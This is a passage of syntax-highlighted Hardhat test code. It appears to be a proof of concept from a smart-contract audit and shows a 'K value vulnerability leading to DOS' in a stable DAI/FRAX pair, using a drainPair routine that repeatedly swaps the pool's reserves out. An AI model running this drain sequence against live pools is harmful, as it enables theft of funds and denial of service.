<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">factory</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">deployer</span><span class="mtk1">).</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk12">pairGenerator</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Get Pair contract factory for later use</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">Pair</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getContractFactory</span><span class="mtk1">(</span><span class="mtk8">"Pair"</span><span class="mtk1">, </span><span class="mtk12">deployer</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    });</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Modified drainPair to use current balances from the pair</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">async</span><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">drainPair</span><span class="mtk1">(</span><span class="mtk12">pairInstance</span><span class="mtk1">, </span><span class="mtk12">currentAttacker</span><span class="mtk1">, </span><span class="mtk12">token0</span><span class="mtk1">, </span><span class="mtk12">token1</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">t0</span><span class="mtk1">, </span><span class="mtk12">t1</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">token0</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">.</span><span class="mtk11">toLowerCase</span><span class="mtk1">() &lt; </span><span class="mtk12">token1</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">.</span><span class="mtk11">toLowerCase</span><span class="mtk1">()) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">t0</span><span class="mtk1"> = </span><span class="mtk12">token0</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">t1</span><span class="mtk1"> = </span><span class="mtk12">token1</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        } </span><span class="mtk15">else</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">t0</span><span class="mtk1"> = </span><span class="mtk12">token1</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">t1</span><span class="mtk1"> = </span><span class="mtk12">token0</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Get current balances from the pair contract right before draining</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">currentBalanceT0InPair</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">t0</span><span class="mtk1">.</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">pairInstance</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">currentBalanceT1InPair</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">t1</span><span class="mtk1">.</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">pairInstance</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Attacker sends 1 of token0 to the pair to facilitate the first swap</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">t0</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">currentAttacker</span><span class="mtk1">).</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">pairInstance</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">currentBalanceT0InPair</span><span class="mtk1"> = </span><span class="mtk12">currentBalanceT0InPair</span><span class="mtk1">.</span><span class="mtk11">add</span><span class="mtk1">(</span><span class="mtk7">1</span><span class="mtk1">); </span><span class="mtk3">// Update local tracking</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Attacker swaps out (current balance of token1 - 1) from the pair</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Ensure we don't try to swap more than available or zero if balance is already 1 or less</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">amountT1ToSwapOut</span><span class="mtk1"> = </span><span class="mtk12">currentBalanceT1InPair</span><span class="mtk1">.</span><span class="mtk11">gt</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">) ? </span><span class="mtk12">currentBalanceT1InPair</span><span class="mtk1">.</span><span class="mtk11">sub</span><span class="mtk1">(</span><span class="mtk7">1</span><span class="mtk1">) : </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">BigNumber</span><span class="mtk1">.</span><span class="mtk11">from</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">amountT1ToSwapOut</span><span class="mtk1">.</span><span class="mtk11">gt</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">)) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">             </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">pairInstance</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">currentAttacker</span><span class="mtk1">).</span><span class="mtk11">swap</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk12">amountT1ToSwapOut</span><span class="mtk1">, </span><span class="mtk12">currentAttacker</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk8">"0x"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// Get actual balance of t0 after the first swap (it might have changed due to swap mechanics if _k was not 0)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">currentBalanceT0InPair</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">t0</span><span class="mtk1">.</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">pairInstance</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Get actual balance of t1 after the first swap</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">currentBalanceT1InPair</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">t1</span><span class="mtk1">.</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">pairInstance</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Attacker sends 1 of token1 to the pair to facilitate the second swap</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">t1</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">currentAttacker</span><span class="mtk1">).</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">pairInstance</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">currentBalanceT1InPair</span><span class="mtk1"> = </span><span class="mtk12">currentBalanceT1InPair</span><span class="mtk1">.</span><span class="mtk11">add</span><span class="mtk1">(</span><span class="mtk7">1</span><span class="mtk1">); </span><span class="mtk3">// Update local tracking</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Attacker swaps out (current balance of token0 -1) from the pair to leave 1 behind</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// This is to match the PoC's final state of 1 t0 and 2 t1</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">amountT0ToSwapOut</span><span class="mtk1"> = </span><span class="mtk12">currentBalanceT0InPair</span><span class="mtk1">.</span><span class="mtk11">gt</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">) ? </span><span class="mtk12">currentBalanceT0InPair</span><span class="mtk1">.</span><span class="mtk11">sub</span><span class="mtk1">(</span><span class="mtk7">1</span><span class="mtk1">) : </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">BigNumber</span><span class="mtk1">.</span><span class="mtk11">from</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">amountT0ToSwapOut</span><span class="mtk1">.</span><span class="mtk11">gt</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">)) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">pairInstance</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">currentAttacker</span><span class="mtk1">).</span><span class="mtk11">swap</span><span class="mtk1">(</span><span class="mtk12">amountT0ToSwapOut</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk12">currentAttacker</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk8">"0x"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">it</span><span class="mtk1">.</span><span class="mtk11">only</span><span class="mtk1">(</span><span class="mtk8">"should demonstrate the K value vulnerability leading to DOS"</span><span class="mtk1">, </span><span class="mtk4">async</span><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Determine token0 and token1 based on addresses for createPair</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">tokenA</span><span class="mtk1">, </span><span class="mtk12">tokenB</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">dai</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">.</span><span class="mtk11">toLowerCase</span><span class="mtk1">() &lt; </span><span class="mtk12">frax</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">.</span><span class="mtk11">toLowerCase</span><span class="mtk1">()) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">tokenA</span><span class="mtk1"> = </span><span class="mtk12">dai</span><span class="mtk1">; </span><span class="mtk3">// token0</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">tokenB</span><span class="mtk1"> = </span><span class="mtk12">frax</span><span class="mtk1">; </span><span class="mtk3">// token1</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        } </span><span class="mtk15">else</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">tokenA</span><span class="mtk1"> = </span><span class="mtk12">frax</span><span class="mtk1">; </span><span class="mtk3">// token0</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">tokenB</span><span class="mtk1"> = </span><span class="mtk12">dai</span><span class="mtk1">; </span><span class="mtk3">// token1</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Create a stable pair</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// The deployer of PairFactory is the owner and can create pairs</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">tx</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">factory</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">deployer</span><span class="mtk1">).</span><span class="mtk11">createPair</span><span class="mtk1">(</span><span class="mtk12">tokenA</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">tokenB</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk4">true</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">receipt</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tx</span><span class="mtk1">.</span><span class="mtk11">wait</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">pairAddress</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">factory</span><span class="mtk1">.</span><span class="mtk11">getPair</span><span class="mtk1">(</span><span class="mtk12">tokenA</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">tokenB</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk4">true</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">expect</span><span class="mtk1">(</span><span class="mtk12">pairAddress</span><span class="mtk1">).</span><span class="mtk12">to</span><span class="mtk1">.</span><span class="mtk12">not</span><span class="mtk1">.</span><span class="mtk11">equal</span><span class="mtk1">(</span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">constants</span><span class="mtk1">.</span><span class="mtk12">AddressZero</span><span class="mtk1">, </span><span class="mtk8">"Pair address should not be zero"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1"> = </span><span class="mtk12">Pair</span><span class="mtk1">.</span><span class="mtk11">attach</span><span class="mtk1">(</span><span class="mtk12">pairAddress</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">`Pair Address: </span><span class="mtk4">${</span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk4">}</span><span class="mtk8">`</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">`Token0: </span><span class="mtk4">${</span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk11">token0</span><span class="mtk1">()</span><span class="mtk4">}</span><span class="mtk8"> (</span><span class="mtk4">${</span><span class="mtk12">tokenA</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1"> === </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk11">token0</span><span class="mtk1">() ? </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tokenA</span><span class="mtk1">.</span><span class="mtk11">symbol</span><span class="mtk1">() : </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tokenB</span><span class="mtk1">.</span><span class="mtk11">symbol</span><span class="mtk1">()</span><span class="mtk4">}</span><span class="mtk8">)`</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">`Token1: </span><span class="mtk4">${</span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk11">token1</span><span class="mtk1">()</span><span class="mtk4">}</span><span class="mtk8"> (</span><span class="mtk4">${</span><span class="mtk12">tokenB</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1"> === </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk11">token1</span><span class="mtk1">() ? </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tokenB</span><span class="mtk1">.</span><span class="mtk11">symbol</span><span class="mtk1">() : </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tokenA</span><span class="mtk1">.</span><span class="mtk11">symbol</span><span class="mtk1">()</span><span class="mtk4">}</span><span class="mtk8">)`</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">numCycles</span><span class="mtk1"> = </span><span class="mtk7">11</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">numCycles</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">`</span><span class="mtk6">\n</span><span class="mtk8">Cycle </span><span class="mtk4">${</span><span class="mtk12">i</span><span class="mtk1"> + </span><span class="mtk7">1</span><span class="mtk4">}</span><span class="mtk8">/</span><span class="mtk4">${</span><span class="mtk12">numCycles</span><span class="mtk4">}</span><span class="mtk8">`</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Attacker transfers MINT_AMOUNT of each token to the pair</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tokenA</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">attacker</span><span class="mtk1">).</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">MINT_AMOUNT</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tokenB</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">attacker</span><span class="mtk1">).</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">MINT_AMOUNT</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">`  Transferred </span><span class="mtk4">${</span><span class="mtk12">MINT_AMOUNT</span><span class="mtk1">.</span><span class="mtk11">toString</span><span class="mtk1">()</span><span class="mtk4">}</span><span class="mtk8"> of </span><span class="mtk4">${</span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tokenA</span><span class="mtk1">.</span><span class="mtk11">symbol</span><span class="mtk1">()</span><span class="mtk4">}</span><span class="mtk8"> and </span><span class="mtk4">${</span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tokenB</span><span class="mtk1">.</span><span class="mtk11">symbol</span><span class="mtk1">()</span><span class="mtk4">}</span><span class="mtk8"> to pair.`</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Attacker mints LP tokens</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">mintTx</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">attacker</span><span class="mtk1">).</span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">attacker</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">mintReceipt</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mintTx</span><span class="mtk1">.</span><span class="mtk11">wait</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Find the Mint event to get actual minted liquidity amount (optional, for detailed logging)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// const mintEvent = mintReceipt.events.find(e =&gt; e.event === 'Mint');</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// const mintedLP = mintEvent.args.liquidity; // This might not be the direct LP amount, depends on Pair event</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">lpBalance</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">attacker</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">totalSupply</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk11">totalSupply</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">`  Minted LP. Attacker LP Balance: </span><span class="mtk4">${</span><span class="mtk12">lpBalance</span><span class="mtk1">.</span><span class="mtk11">toString</span><span class="mtk1">()</span><span class="mtk4">}</span><span class="mtk8">, Pair TotalSupply: </span><span class="mtk4">${</span><span class="mtk12">totalSupply</span><span class="mtk1">.</span><span class="mtk11">toString</span><span class="mtk1">()</span><span class="mtk4">}</span><span class="mtk8">`</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Call drainPair without initial balances, it will fetch them</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk11">drainPair</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">, </span><span class="mtk12">attacker</span><span class="mtk1">, </span><span class="mtk12">tokenA</span><span class="mtk1">, </span><span class="mtk12">tokenB</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">"  Called drainPair."</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">pairTokenABalance</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tokenA</span><span class="mtk1">.</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">pairTokenBBalance</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tokenB</span><span class="mtk1">.</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">`  Pair </span><span class="mtk4">${</span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tokenA</span><span class="mtk1">.</span><span class="mtk11">symbol</span><span class="mtk1">()</span><span class="mtk4">}</span><span class="mtk8"> balance after drain: </span><span class="mtk4">${</span><span class="mtk12">pairTokenABalance</span><span class="mtk1">.</span><span class="mtk11">toString</span><span class="mtk1">()</span><span class="mtk4">}</span><span class="mtk8">`</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">`  Pair </span><span class="mtk4">${</span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tokenB</span><span class="mtk1">.</span><span class="mtk11">symbol</span><span class="mtk1">()</span><span class="mtk4">}</span><span class="mtk8"> balance after drain: </span><span class="mtk4">${</span><span class="mtk12">pairTokenBBalance</span><span class="mtk1">.</span><span class="mtk11">toString</span><span class="mtk1">()</span><span class="mtk4">}</span><span class="mtk8">`</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Assertions based on PoC logs (DAI balance: 1, FRAX balance: 2)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Token A (e.g. DAI if token0) should be 1</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Token B (e.g. FRAX if token1) should be 2</span></span></span>
